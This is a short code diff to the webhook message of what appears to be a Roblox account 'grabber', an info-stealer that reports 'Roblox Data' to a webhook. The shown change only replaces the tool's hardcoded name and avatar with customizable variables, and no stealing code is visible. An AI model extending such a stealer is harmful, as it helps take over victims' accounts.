@@ -36,13 +36,13 @@ def RobloxC(webhook):
                 },
                 ],
             "footer": {
-                "text": f"Fake Grabber · Roblox Data · {vbv}",
-                "icon_url": "https://media.tenor.com/noyn9bef3O8AAAAd/zerotwo-dance.gif"
+                "text": f"{oembed} · Roblox Data · {vbv}",
+                "icon_url": f"{pfpembed}"
                 },
             }
         ],
-        "avatar_url": "https://media.tenor.com/noyn9bef3O8AAAAd/zerotwo-dance.gif",
-        "username": "Fake Grabber",
+        "avatar_url": f"{pfpembed}",
+        "username": f"{oembed}",
         "attachments": []
         }
 
